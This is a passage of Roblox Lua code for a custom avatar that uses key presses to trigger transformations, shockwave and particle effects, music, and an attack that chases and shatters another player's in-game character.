for i,x in pairs(slachtoffer.Parent:GetDescendants()) do if x:IsA("Part") then x:Clone() x.Parent = workspace x.Material = "Glass" x.BrickColor = BrickColor.new("Really black") x.Anchored = false
x.CanCollide = true x:BreakJoints() end end
for i,x in pairs(slachtoffer.Parent:GetDescendants()) do if x:IsA("Part") then x:Remove() end end
slachtoffer.Parent:BreakJoints()
end
end
coroutine.wrap(function()
local shockwave = Instance.new("Part", Torso)
shockwave.Size = Vector3.new(1,1,1)
shockwave.CanCollide = false
shockwave.Anchored = true
shockwave.Transparency = .4
shockwave.BrickColor = BrickColor.new("Really black")
shockwave.CFrame = CFrame.new(energballplosion.Position) * CFrame.new(0,-8,0)
local shockwavemesh = Instance.new("SpecialMesh", shockwave)
shockwavemesh.Scale = Vector3.new(10,6,10)
shockwavemesh.MeshId = "rbxassetid://20329976"
local shockwave2 = Instance.new("Part", Torso)
shockwave2.Size = Vector3.new(1,1,1)
shockwave2.CanCollide = false
shockwave2.Anchored = true
shockwave2.Transparency = .4
shockwave2.BrickColor = BrickColor.new("Really black")
shockwave2.CFrame = CFrame.new(energballplosion.Position) * CFrame.new(0,-8,0)
local shockwavemesh2 = Instance.new("SpecialMesh", shockwave2)
shockwavemesh2.Scale = Vector3.new(11,6,11)
shockwavemesh2.MeshId = "rbxassetid://20329976"
local biggar = 0
local biggar2 = 0
for i = 1, 30 do
biggar = biggar + 14
biggar2 = biggar2 + 22
shockwave.CFrame = shockwave.CFrame * CFrame.Angles(math.rad(0),math.rad(0+math.random(-4,12)),0)
shockwave2.CFrame = shockwave2.CFrame * CFrame.Angles(math.rad(0),math.rad(0-math.random(-4,12)),0)
shockwave.Transparency = shockwave.Transparency + 0.05
shockwave2.Transparency = shockwave2.Transparency + 0.05
shockwavemesh2.Scale = shockwavemesh2.Scale + Vector3.new(16 + biggar,12 + biggar,16 + biggar)
shockwavemesh.Scale = shockwavemesh.Scale + Vector3.new(18 + biggar2,12,18 + biggar2)
swait()
end
shockwave:Remove()
shockwave2:Remove()
	end)()
energballplosion.Size = energballplosion.Size + Vector3.new(7,7,7)
swait()
end
for i = 1, 50 do
energballplosion.Size = energballplosion.Size + Vector3.new(5,5,5)
energballplosion.Transparency = energballplosion.Transparency + .025
swait()
end
energballplosion:Remove()
end
end)
for i = 1, 20 do
HAND1LERP.C0 = HAND1LERP.C0:lerp(CFrame.new(6,-5 + .5 * math.sin(sine/14),6) * CFrame.Angles(math.rad(20 + 1 * math.sin(sine/13)),math.rad(-5 + 5 * math.sin(sine/12)),math.rad(-36 - 4 * math.sin(sine/11))),.2)
HAND2LERP.C0 = HAND2LERP.C0:lerp(CFrame.new(-5.5,0,5) * CFrame.Angles(math.rad(30),math.rad(-28),math.rad(37)),.2)
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),math.rad(35),0),.2)
swait()
end
removeuseless:AddItem(g1,.001)
debounce = false
if xester then
ws = 155
else
ws = 92
end
attacking = false
end
elseif Press=='x' then
if debounce then return end
debounce = true
attacking = true
ws = 0
for i = 1, 70 do
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(-50),math.rad(0 * math.sin(sine/16)),math.rad(0)),.1)
HAND1LERP.C0 = HAND1LERP.C0:lerp(CFrame.new(-2,-2,-4) * CFrame.Angles(math.rad(-50 + 2 * math.sin(sine)),math.rad(180 + 1 * math.sin(sine)),math.rad(30 + 2 * math.sin(sine))),.1)
HAND2LERP.C0 = HAND2LERP.C0:lerp(CFrame.new(2,-2,-4) * CFrame.Angles(math.rad(-50 + 2 * math.sin(sine)),math.rad(180 - 1 * math.sin(sine)),math.rad(-30 - 2 * math.sin(sine))),.1)
swait()
end
for i = 1, 40 do
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(-50),math.rad(0 * math.sin(sine/16)),math.rad(0)),.05)
HAND1LERP.C0 = HAND1LERP.C0:lerp(CFrame.new(-2,-2,-4) * CFrame.Angles(math.rad(-50 + 4 * math.sin(sine)),math.rad(180 + 2 * math.sin(sine)),math.rad(30 + 4 * math.sin(sine))),.05)
HAND2LERP.C0 = HAND2LERP.C0:lerp(CFrame.new(2,-2,-4) * CFrame.Angles(math.rad(-50 + 4 * math.sin(sine)),math.rad(180 - 2 * math.sin(sine)),math.rad(-30 - 4 * math.sin(sine))),.05)
swait()
end
rachjumper = true
xester = false
doomtheme.Volume = 0
coroutine.wrap(function()
local shockwave = Instance.new("Part", Torso)
shockwave.Size = Vector3.new(1,1,1)
shockwave.CanCollide = false
shockwave.Anchored = true
shockwave.Transparency = .2
shockwave.BrickColor = BrickColor.new("Really red")
shockwave.CFrame = CFrame.new(Root.Position) * CFrame.new(0,-8,0)
local shockwavemesh = Instance.new("SpecialMesh", shockwave)
shockwavemesh.Scale = Vector3.new(10,1,10)
shockwavemesh.MeshId = "rbxassetid://20329976"
local shockwave2 = Instance.new("Part", Torso)
shockwave2.Size = Vector3.new(1,1,1)
shockwave2.CanCollide = false
shockwave2.Anchored = true
shockwave2.Transparency = .2
shockwave2.BrickColor = BrickColor.new("Really red")
shockwave2.CFrame = CFrame.new(Root.Position) * CFrame.new(0,-8,0)
local shockwavemesh2 = Instance.new("SpecialMesh", shockwave2)
shockwavemesh2.Scale = Vector3.new(1,1,1)
shockwavemesh2.MeshId = "rbxassetid://20329976"
for i = 1, 30 do
shockwave.CFrame = shockwave.CFrame * CFrame.Angles(math.rad(0),math.rad(0+16),0)
shockwave2.CFrame = shockwave2.CFrame * CFrame.Angles(math.rad(0),math.rad(0-16),0)
shockwave.Transparency = shockwave.Transparency + 0.05
shockwave2.Transparency = shockwave2.Transparency + 0.05
shockwavemesh2.Scale = shockwavemesh2.Scale + Vector3.new(10,1,10)
shockwavemesh.Scale = shockwavemesh.Scale + Vector3.new(14,2,14)
swait()
end
shockwave:Remove()
shockwave2:Remove()
	end)()
coroutine.wrap(function()
local nball = Instance.new("Part",Torso)
nball.Size = Vector3.new(4,4,4)
nball.Material = "Neon"
nball.BrickColor = BrickColor.new("Really red")
nball.Shape = "Ball"
nball.Anchored = true
nball.CanCollide = false
nball.CFrame = Torso.CFrame
for i = 1, 40 do
nball.Size = nball.Size + Vector3.new(5.5,5.5,5.5)
nball.Transparency = nball.Transparency + .05
swait()
end
nball:Remove()
end)()
particlecolor = ColorSequence.new(Color3.new(255, 255, 255))

particlemiter1 = Instance.new("ParticleEmitter", bighead)
particlemiter1.Enabled = true
particlemiter1.Color = particlecolor
particlemiter1.Texture = "rbxassetid://1390780157"
particlemiter1.Lifetime = NumberRange.new(.05)
particlemiter1.Size = NumberSequence.new(7.5,7.5)
particlemiter1.Rate = 4
particlemiter1.Rotation = NumberRange.new(0,360)
particlemiter1.RotSpeed = NumberRange.new(0)
particlemiter1.Speed = NumberRange.new(0)

particlemiter2 = Instance.new("ParticleEmitter", hand1)
particlemiter2.Enabled = true
particlemiter2.Color = particlecolor
particlemiter2.Texture = "rbxassetid://1390780157"
particlemiter2.Lifetime = NumberRange.new(.05)
particlemiter2.Size = NumberSequence.new(5,5)
particlemiter2.Rate = 4
particlemiter2.Rotation = NumberRange.new(0,360)
particlemiter2.RotSpeed = NumberRange.new(0)
particlemiter2.Speed = NumberRange.new(0)

particlemiter3 = Instance.new("ParticleEmitter", hand2)
particlemiter3.Enabled = true
particlemiter3.Color = particlecolor
particlemiter3.Texture = "rbxassetid://1390780157"
particlemiter3.Lifetime = NumberRange.new(.05)
particlemiter3.Size = NumberSequence.new(5,5)
particlemiter3.Rate = 4
particlemiter3.Rotation = NumberRange.new(0,360)
particlemiter3.RotSpeed = NumberRange.new(0)
particlemiter3.Speed = NumberRange.new(0)
coroutine.wrap(function()
transformsound = Instance.new("Sound",Torso)
transformsound.Volume = 10
transformsound.SoundId = "rbxassetid://159576182"
transformsound:Play() 
coroutine.wrap(function()
wait(1)
realmofexistence = Instance.new("Sound",Torso)
realmofexistence.Volume = 8
realmofexistence.SoundId = "rbxassetid://2565721367"
realmofexistence:Play()
end)()
wait(2.2)
doomtheme.SoundId = "rbxassetid://2902017580"
doomtheme:Play()
doomtheme.Pitch = 1
doomtheme.TimePosition = 0
for i = 1, 30 do
doomtheme.Volume = doomtheme.Volume + .25
swait()
end
end)()

slaten.Transparency = 1
slaten2.Transparency = 1
slateh.Transparency = 1
slateh2.Transparency = 1
slateh3.Transparency = 1
slateh4.Transparency = 1
slateh5.Transparency = 1
slatex.Transparency = 1
slatex2.Transparency = 1
slatex3.Transparency = 1
slatex4.Transparency = 1
slatex5.Transparency = 1
slatez.Transparency = 1
slatez2.Transparency = 1
slatez3.Transparency = 1
slatez4.Transparency = 1
eyeball1.Transparency = 1
eyeball2.Transparency = 1
eyeball3.Transparency = 1
eyeball4.Transparency = 1
lightpart1.Transparency = 1
Root.Anchored = false
horns.Material = "Slate"
horns.Locked = true
horns.BrickColor = BrickColor.new("Really black")
hornsmesh.MeshId = "rbxassetid://398618628"
hornsmesh.VertexColor = Vector3.new(1,0,0)
hornsmesh.TextureId = "rbxassetid://1461382301"
hornsmesh.Scale = Vector3.new(4.9, 5.5, 5.8)
hornsweld.C0 = CFrame.new(0,3.8,-4.5) * CFrame.Angles(math.rad(0),math.rad(0),0)
mask.Anchored = false
mask.Locked = true
mask.CanCollide = false
mask.Transparency = 0
mask.BrickColor = BrickColor.new("White")
mask.Material = "Corroded Metal"
maskweld.C0 = CFrame.new(0,1.45,-.4) * CFrame.Angles(math.rad(0),0,0)
maskmesh.MeshId = "rbxassetid://64560176"
maskmesh.TextureId = "rbxassetid://1326186614"
maskmesh.Scale = Vector3.new(5.04, 5.04, 5.04)
hand2.BrickColor = BrickColor.new("Really black")
hand1.BrickColor = BrickColor.new("Really black")
face = Instance.new("Decal",bighead)
face.Texture = "rbxassetid://1127768638"
face.Color3 = Color3.new(255, 255, 255)
face.Face = "Front"
attacking = false
ws = 92
debounce = false
elseif Press=='z' then
if debounce then return end
debounce = true
attacking = true
ws = 0
for i = 1, 70 do
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(-50),math.rad(0 * math.sin(sine/16)),math.rad(0)),.1)
HAND1LERP.C0 = HAND1LERP.C0:lerp(CFrame.new(-2,-2,-4) * CFrame.Angles(math.rad(-50 + 2 * math.sin(sine)),math.rad(180 + 1 * math.sin(sine)),math.rad(30 + 2 * math.sin(sine))),.1)
HAND2LERP.C0 = HAND2LERP.C0:lerp(CFrame.new(2,-2,-4) * CFrame.Angles(math.rad(-50 + 2 * math.sin(sine)),math.rad(180 - 1 * math.sin(sine)),math.rad(-30 - 2 * math.sin(sine))),.1)
swait()
end
for i = 1, 40 do
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(-50),math.rad(0 * math.sin(sine/16)),math.rad(0)),.05)
HAND1LERP.C0 = HAND1LERP.C0:lerp(CFrame.new(-2,-2,-4) * CFrame.Angles(math.rad(-50 + 4 * math.sin(sine)),math.rad(180 + 2 * math.sin(sine)),math.rad(30 + 4 * math.sin(sine))),.05)
HAND2LERP.C0 = HAND2LERP.C0:lerp(CFrame.new(2,-2,-4) * CFrame.Angles(math.rad(-50 + 4 * math.sin(sine)),math.rad(180 - 2 * math.sin(sine)),math.rad(-30 - 4 * math.sin(sine))),.05)
swait()
end
if rachjumper then
face:Remove()
particlemiter1:Remove()
particlemiter2:Remove()
particlemiter3:Remove()
end
xester = true
rachjumper = false
hand1.BrickColor = BrickColor.new("White")
hand2.BrickColor = BrickColor.new("White")
coroutine.wrap(function()
local shockwave = Instance.new("Part", Torso)
shockwave.Size = Vector3.new(1,1,1)
shockwave.CanCollide = false
shockwave.Anchored = true
shockwave.Transparency = .2
shockwave.BrickColor = BrickColor.new("White")
shockwave.CFrame = CFrame.new(Root.Position) * CFrame.new(0,-8,0)
local shockwavemesh = Instance.new("SpecialMesh", shockwave)
shockwavemesh.Scale = Vector3.new(10,1,10)
shockwavemesh.MeshId = "rbxassetid://20329976"
local shockwave2 = Instance.new("Part", Torso)
shockwave2.Size = Vector3.new(1,1,1)
shockwave2.CanCollide = false
shockwave2.Anchored = true
shockwave2.Transparency = .2
shockwave2.BrickColor = BrickColor.new("White")
shockwave2.CFrame = CFrame.new(Root.Position) * CFrame.new(0,-8,0)
local shockwavemesh2 = Instance.new("SpecialMesh", shockwave2)
shockwavemesh2.Scale = Vector3.new(1,1,1)
shockwavemesh2.MeshId = "rbxassetid://20329976"
for i = 1, 30 do
shockwave.CFrame = shockwave.CFrame * CFrame.Angles(math.rad(0),math.rad(0+16),0)
shockwave2.CFrame = shockwave2.CFrame * CFrame.Angles(math.rad(0),math.rad(0-16),0)
shockwave.Transparency = shockwave.Transparency + 0.05
shockwave2.Transparency = shockwave2.Transparency + 0.05
shockwavemesh2.Scale = shockwavemesh2.Scale + Vector3.new(10,1,10)
shockwavemesh.Scale = shockwavemesh.Scale + Vector3.new(14,2,14)
swait()
end
shockwave:Remove()
shockwave2:Remove()
	end)()
coroutine.wrap(function()
local nball = Instance.new("Part",Torso)
nball.Size = Vector3.new(4,4,4)
nball.Material = "Neon"
nball.BrickColor = BrickColor.new("White")
nball.Shape = "Ball"
nball.Anchored = true
nball.CanCollide = false
nball.CFrame = Torso.CFrame
for i = 1, 40 do
nball.Size = nball.Size + Vector3.new(5.5,5.5,5.5)
nball.Transparency = nball.Transparency + .05
swait()
end
nball:Remove()
end)()
doomtheme.SoundId = "rbxassetid://1382488262"
doomtheme:Play()
doomtheme.Volume = 6
doomtheme.Pitch = 1
doomtheme.TimePosition = 20.7
slaten.Transparency = 1
slaten2.Transparency = 1
slateh.Transparency = 1
slateh2.Transparency = 1
slateh3.Transparency = 1
slateh4.Transparency = 1
slateh5.Transparency = 1
slatex.Transparency = 1
slatex2.Transparency = 1
slatex3.Transparency = 1
slatex4.Transparency = 1
slatex5.Transparency = 1
slatez.Transparency = 1
slatez2.Transparency = 1
slatez3.Transparency = 1
slatez4.Transparency = 1
eyeball1.Transparency = 1
eyeball2.Transparency = 1
eyeball3.Transparency = 1
eyeball4.Transparency = 1
lightpart1.Transparency = 0
laugh = laughs[math.random(1,#laughs)]
local laughy = Instance.new("Sound",Head)
laughy.SoundId = "rbxassetid://"..laugh
laughy.Volume = 10
laughy:Play()
removeuseless:AddItem(laughy,10)
Root.Anchored = false
horns.Material = "Slate"
horns.Locked = true
horns.BrickColor = BrickColor.new("Really black")
hornsmesh.MeshId = "rbxassetid://193760002"
hornsmesh.VertexColor = Vector3.new(1,0,0)
hornsmesh.TextureId = "rbxassetid://379225327"
hornsmesh.Scale = Vector3.new(5.41,5.41,5.41)
hornsweld.C0 = CFrame.new(0,-2.75,-1.7) * CFrame.Angles(math.rad(0),math.rad(0),math.rad(0))
mask.Anchored = false
mask.Locked = true
mask.CanCollide = false
mask.BrickColor = BrickColor.new("White")
mask.Material = "Corroded Metal"
maskweld.C0 = CFrame.new(0,0,2.5) * CFrame.Angles(math.rad(0),0,0)
maskmesh.MeshId = "rbxassetid://13520257"
maskmesh.TextureId = "rbxassetid://13520260"
maskmesh.Scale = Vector3.new(5.53, 5, 5.1)
for i = 1, 30 do
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(30),math.rad(0 * math.sin(sine/16)),math.rad(0)),.1)
swait()
end
for i = 1, 50 do
HAND2LERP.C0 = HAND2LERP.C0:lerp(CFrame.new(2,-2,-4) * CFrame.Angles(math.rad(-140 + 2 * math.sin(sine)),math.rad(180 - 1 * math.sin(sine)),math.rad(-30 - 2 * math.sin(sine))),.03)
HAND1LERP.C0 = HAND1LERP.C0:lerp(CFrame.new(-2,-2,-4) * CFrame.Angles(math.rad(-140 + 2 * math.sin(sine)),math.rad(180 + 1 * math.sin(sine)),math.rad(30 + 2 * math.sin(sine))),.03)
swait()
end
for i = 1, 50 do
HAND2LERP.C0 = HAND2LERP.C0:lerp(CFrame.new(2,-2,-4) * CFrame.Angles(math.rad(-140 + 8 * math.sin(sine)),math.rad(180 - 5 * math.sin(sine)),math.rad(-30 - 8 * math.sin(sine))),.03)
HAND1LERP.C0 = HAND1LERP.C0:lerp(CFrame.new(-2,-2,-4) * CFrame.Angles(math.rad(-140 + 8 * math.sin(sine)),math.rad(180 + 5 * math.sin(sine)),math.rad(30 + 8 * math.sin(sine))),.03)
swait()
end
ws = 155
Root.Anchored = false
debounce = false
attacking = false
xester = true
elseif Press=='r' then
if mouse.Target ~= nil and mouse.Target.Parent:FindFirstChildOfClass("Humanoid") then
if debounce then return end
debounce = true
attacking = true
local enemy = mouse.Target.Parent:FindFirstChildOfClass("Humanoid")
local targ = mouse.Target.Parent:FindFirstChildOfClass("Humanoid").Parent
SOUND(Head,1837106999,10,false,10)
ws = 0
local z = { 
Color = BrickColor.new("Crimson").Color
}
local z2 = { 
Color = BrickColor.new("Really black").Color
}
eyeball1.Material = "Neon"
eyeball2.Material = "Neon"
for i = 1, 7 do
local lol = smoothen:Create(eyeball1,TweenInfo.new(.3,Enum.EasingStyle.Linear),z)
lol:Play()
local lol2 = smoothen:Create(eyeball2,TweenInfo.new(.3,Enum.EasingStyle.Linear),z)
lol2:Play()
HAND1LERP.C0 = HAND1LERP.C0:lerp(CFrame.new(-2,-2,-4) * CFrame.Angles(math.rad(-50),math.rad(180),math.rad(10)),.2)
HAND2LERP.C0 = HAND2LERP.C0:lerp(CFrame.new(2,-2,-4) * CFrame.Angles(math.rad(-50),math.rad(180),math.rad(-10)),.2)
swait()
end
for i = 1, 70 do
local lol = smoothen:Create(eyeball1,TweenInfo.new(.3,Enum.EasingStyle.Linear),z)
lol:Play()
local lol2 = smoothen:Create(eyeball2,TweenInfo.new(.3,Enum.EasingStyle.Linear),z)
lol2:Play()
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(-50),math.rad(0 * math.sin(sine/16)),math.rad(0)),.05)
HAND1LERP.C0 = HAND1LERP.C0:lerp(CFrame.new(-2,-2,-4) * CFrame.Angles(math.rad(-50 + 2 * math.sin(sine)),math.rad(180 + 1 * math.sin(sine)),math.rad(30 + 2 * math.sin(sine))),.05)
HAND2LERP.C0 = HAND2LERP.C0:lerp(CFrame.new(2,-2,-4) * CFrame.Angles(math.rad(-50 + 2 * math.sin(sine)),math.rad(180 - 1 * math.sin(sine)),math.rad(-30 - 2 * math.sin(sine))),.05)
swait()
end
for i = 1, 40 do
local lol = smoothen:Create(eyeball1,TweenInfo.new(.3,Enum.EasingStyle.Linear),z)
lol:Play()
local lol2 = smoothen:Create(eyeball2,TweenInfo.new(.3,Enum.EasingStyle.Linear),z)
lol2:Play()
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(-50),math.rad(0 * math.sin(sine/16)),math.rad(0)),.05)
HAND1LERP.C0 = HAND1LERP.C0:lerp(CFrame.new(-2,-2,-4) * CFrame.Angles(math.rad(-50 + 4 * math.sin(sine)),math.rad(180 + 2 * math.sin(sine)),math.rad(30 + 4 * math.sin(sine))),.05)
HAND2LERP.C0 = HAND2LERP.C0:lerp(CFrame.new(2,-2,-4) * CFrame.Angles(math.rad(-50 + 4 * math.sin(sine)),math.rad(180 - 2 * math.sin(sine)),math.rad(-30 - 4 * math.sin(sine))),.05)
swait()
end
attacking = false
local targetfound = false
local chasemusic = Instance.new("Sound",Head)
chasemusic.Volume = 10
chasemusic.SoundId = "rbxassetid://2866313732"
chasemusic.Looped = true
chasemusic:Play()
for i = 1, 1000 do
if targetfound then break end
local Hit = damagealll(15,Torso.Position)
for _,v in pairs(Hit) do
if v:FindFirstChildOfClass("Humanoid") and v:FindFirstChildOfClass("Humanoid").Parent.Name == enemy.Parent.Name then
targetfound = true
slachtoffer = v:FindFirstChildOfClass("Humanoid")
end
end
huntdown = true
hum:MoveTo(enemy.Parent.Torso.Position)
ws = 150
swait()
end
if targetfound then
attacking = true
local lweld = weldBetween(enemy.Parent.Torso,hand1)
lweld.C0 = CFrame.new(2,-2,0) * CFrame.Angles(math.rad(0),math.rad(90),math.rad(90))
ws = 0
enemy.WalkSpeed = 0
enemy.JumpPower = 0
local IAMHERE = Instance.new("Sound",Head)
IAMHERE.SoundId = "rbxassetid://2867055627"
IAMHERE.Volume = 10
IAMHERE:Play()
removeuseless:AddItem(IAMHERE,10)
for i = 1, 220 do
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(-10),math.rad(0 * math.sin(sine/16)),math.rad(0)),.05)
HAND1LERP.C0 = HAND1LERP.C0:lerp(CFrame.new(2,-7.5,-2.2) * CFrame.Angles(math.rad(90 + 2 * math.sin(sine)),math.rad(2 * math.sin(sine)),math.rad(-80 + 2 * math.sin(sine))),.2)
HAND2LERP.C0 = HAND2LERP.C0:lerp(CFrame.new(-2,-7.5,-2.2) * CFrame.Angles(math.rad(90 - 2 * math.sin(sine)),math.rad(2 * math.sin(sine)),math.rad(80 - 2 * math.sin(sine))),.2)
swait()
end
lweld:Remove()
coroutine.wrap(function()
local w = Instance.new("Part",Torso)
w.Anchored = true
w.CanCollide = false
w.Material = "Neon"
w.BrickColor = BrickColor.new("Really black")
if targ:FindFirstChildOfClass("Humanoid").RigType == Enum.HumanoidRigType.R15 then
w.CFrame = targ:FindFirstChild("UpperTorso").CFrame
elseif targ:FindFirstChildOfClass("Humanoid").RigType == Enum.HumanoidRigType.R6 then
w.CFrame = targ:FindFirstChild("Torso").CFrame
end
w.Size = Vector3.new(3,3,3)
w.Shape = "Ball"
for i = 1, 50 do
w.Transparency = w.Transparency + .05
w.Size = w.Size + Vector3.new(3.5,3.5,3.5)
swait()
end
w:Remove()
end)()
for i = 1, 8 do
coroutine.wrap(function()
local ps = Instance.new("Part",Torso)
ps.Size = Vector3.new(1,1,1)
ps.Anchored = true
ps.BrickColor = BrickColor.new("Really black")
ps.Material = "Neon"
if targ:FindFirstChildOfClass("Humanoid").RigType == Enum.HumanoidRigType.R15 then
ps.CFrame = targ:FindFirstChild("UpperTorso").CFrame * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
elseif targ:FindFirstChildOfClass("Humanoid").RigType == Enum.HumanoidRigType.R6 then
ps.CFrame = targ:FindFirstChild("Torso").CFrame * CFrame.Angles(math.rad(math.random(-180,180)),math.rad(math.random(-180,180)),math.rad(math.random(-180,180)))
end
local psm = Instance.new("SpecialMesh",ps)
psm.MeshType = "Sphere"
psm.Scale = Vector3.new(3,1,3)
for i = 1, 50 do
psm.Scale = psm.Scale + Vector3.new(0,5,0)
ps.Transparency = ps.Transparency + .025
swait()
end
ps:Remove()
end)()
end
for i,x in pairs(targ:GetDescendants()) do if x:IsA("Part") then x:Clone() x.Parent = workspace x.Material = "Glass" x.BrickColor = BrickColor.new("Really black") x.Anchored = false
x.CanCollide = true x:BreakJoints() end end
for i,x in pairs(targ:GetDescendants()) do if x:IsA("Part") then x:Remove() end end
targ:BreakJoints()
SOUND(hand1,264486467,8,false,10)
huntdown = false
for i = 1, 25 do
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(-25),math.rad(0 * math.sin(sine/16)),math.rad(0)),.05)
local lol = smoothen:Create(eyeball1,TweenInfo.new(.5,Enum.EasingStyle.Linear),z2)
lol:Play()
local lol2 = smoothen:Create(eyeball2,TweenInfo.new(.5,Enum.EasingStyle.Linear),z2)
lol2:Play()
chasemusic.Volume = chasemusic.Volume - .5
HAND1LERP.C0 = HAND1LERP.C0:lerp(CFrame.new(2,-7.5,-1) * CFrame.Angles(math.rad(90),math.rad(0),math.rad(-80)),.2)
HAND2LERP.C0 = HAND2LERP.C0:lerp(CFrame.new(-2,-7.5,-1) * CFrame.Angles(math.rad(90),math.rad(0),math.rad(80)),.2)
swait()
end
chasemusic:Remove()
if xester then
ws = 155
else
ws = 92
end
eyeball1.Material = "Glass"
eyeball2.Material = "Glass"
attacking = false
debounce = false
else
if xester then
ws = 155
else
ws = 92
end
huntdown = false
eyeball1.Material = "Glass"
eyeball2.Material = "Glass"
debounce = false
attacking = false
coroutine.wrap(function()
for i = 1, 25 do
if debounce then break end
local lol = smoothen:Create(eyeball1,TweenInfo.new(.5,Enum.EasingStyle.Linear),z2)
lol:Play()
local lol2 = smoothen:Create(eyeball2,TweenInfo.new(.5,Enum.EasingStyle.Linear),z2)
lol2:Play()
swait()
end
end)()
chasemusic:Remove()
end
end
elseif Press=='e' then
if debounce then return end
debounce = true
attacking = true
g1 = Instance.new("BodyGyro", Root)
g1.D = 175
g1.P = 20000
g1.MaxTorque = Vector3.new(0,9000,0)
ws = 30
for i =  1,  75 do
g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,mouse.Hit.p),.2)
HAND1LERP.C0 = HAND1LERP.C0:lerp(CFrame.new(5.2 + .6 * math.sin(sine/14),-5,6) * CFrame.Angles(math.rad(15 * math.sin(sine/12)),math.rad(16 * math.sin(sine/14)),math.rad(0)),.2)
HAND2LERP.C0 = HAND2LERP.C0:lerp(CFrame.new(-5.2 + .6 * math.sin(sine/14),-5,6) * CFrame.Angles(math.rad(-15 * math.sin(sine/12)),math.rad(-16 * math.sin(sine/14)),math.rad(0)),.2)
swait()
end
local bwoo = Instance.new("Sound",Torso)
bwoo.SoundId = "rbxassetid://134012322"
bwoo.Volume = 10
bwoo.Pitch = .85
bwoo:Play()
removeuseless:AddItem(bwoo,7)
for i =  1,  25 do
g1.CFrame = g1.CFrame:lerp(CFrame.new(Root.Position,mouse.Hit.p),.2)
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(25),math.rad(0 * math.sin(sine/16)),math.rad(0)),.2)
HAND1LERP.C0 = HAND1LERP.C0:lerp(CFrame.new(5.2,-5,6) * CFrame.Angles(math.rad(-94 + 8 * math.sin(sine/12)),math.rad(3 * math.sin(sine/10)),math.rad(0)),.2)
HAND2LERP.C0 = HAND2LERP.C0:lerp(CFrame.new(-5.2,-5,6) * CFrame.Angles(math.rad(-94 - 8 * math.sin(sine/12)),math.rad(3 * -math.sin(sine/10)),math.rad(0)),.2)
swait()
end
ws = 0
for i =  1,  3 do
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(0),math.rad(0 * math.sin(sine/16)),math.rad(0)),.2)
HAND1LERP.C0 = HAND1LERP.C0:lerp(CFrame.new(5.2,-5,6) * CFrame.Angles(math.rad(-76 + 8 * math.sin(sine/12)),math.rad(3 * math.sin(sine/10)),math.rad(0)),.2)
HAND2LERP.C0 = HAND2LERP.C0:lerp(CFrame.new(-5.2,-5,6) * CFrame.Angles(math.rad(-76 - 8 * math.sin(sine/12)),math.rad(3 * -math.sin(sine/10)),math.rad(0)),.2)
swait()
end
local rocksm = Instance.new("Sound",Torso)
rocksm.SoundId = "rbxassetid://168514932"
rocksm.Volume = 10
rocksm.Pitch = .94
rocksm:Play()
removeuseless:AddItem(rocksm,7)
removeuseless:AddItem(g1,.001)
local rb = Instance.new("Part",Torso)
rb.Size = Vector3.new(.1,.1,.1)
rb.Anchored = false
rb.Transparency = 1
rb.CanCollide = false
rb.CFrame = CFrame.new(mouse.Hit.p) * CFrame.new(0,30,10)
local rbweld = weldBetween(rb,Root)
rbweld.C0 = CFrame.new(0,10,45)
local txc = 10
coroutine.wrap(function()
	for i = 1, 10 do
		coroutine.wrap(function()
	local sondb = Instance.new("Part",rb)
	sondb.Anchored = true
	sondb.Transparency = 1
	sondb.CanCollide = false
	sondb.CFrame = rb.CFrame
	local booms = Instance.new("Sound",sondb)
	booms.SoundId = "rbxassetid://2175667385"
	booms.Volume = 5
	booms.Pitch = .8
	for i = 1, 20 do
		swait()
	end
	wait(1)
	booms:Play()
	end)()
	swait(6)
	end
end)()
for i = 1, 90 do
ROOTLERP.C0 = ROOTLERP.C0:lerp(CFrame.new(0,0,0) * CFrame.Angles(math.rad(-30),math.rad(0 * math.sin(sine/16)),math.rad(0)),.2)
HAND1LERP.C0 = HAND1LERP.C0:lerp(CFrame.new(5.2,-2,7.2 + .95 * math.sin(sine/12)) * CFrame.Angles(math.rad(45),math.rad(-9),math.rad(0)),.2)
HAND2LERP.C0 = HAND2LERP.C0:lerp(CFrame.new(-5.2,-2,7.2+ .95 * math.sin(sine/12)) * CFrame.Angles(math.rad(45),math.rad(9),math.rad(0)),.2)
	coroutine.wrap(function()
	local cyl = Instance.new("Part",Torso)
	cyl.Shape = "Cylinder"
	cyl.BrickColor = BrickColor.new("Really black")
	cyl.Anchored = true
	cyl.Transparency = 1
	cyl.CanCollide = false
	cyl.Material = "Neon"
	cyl.CFrame = rb.CFrame * CFrame.new(math.random(-30,30),2,math.random(-30,30)) * CFrame.Angles(math.rad(90),math.rad(90),0)
	cyl.Size = Vector3.new(4,6 * math.random(4,8),6 * math.random(4,8))
	for i = 1, 20 do
		cyl.Transparency = cyl.Transparency - .05
		swait()
	end
	wait(1)
	local brock = Instance.new("Part",Torso)
	brock.Size = Vector3.new(9,70 + math.random(10,33),9)
	brock.Anchored = true
	brock.Transparency = .3
	brock.CanCollide = false
	brock.Material = "Neon"
	brock.BrickColor = BrickColor.new("Really black")
	brock.CFrame = cyl.CFrame * CFrame.new(0,70,0)
	coroutine.wrap(function()
local shockwave = Instance.new("Part", Torso)
shockwave.Size = Vector3.new(1,1,1)
shockwave.CanCollide = false
shockwave.Anchored = true
shockwave.Transparency = .4
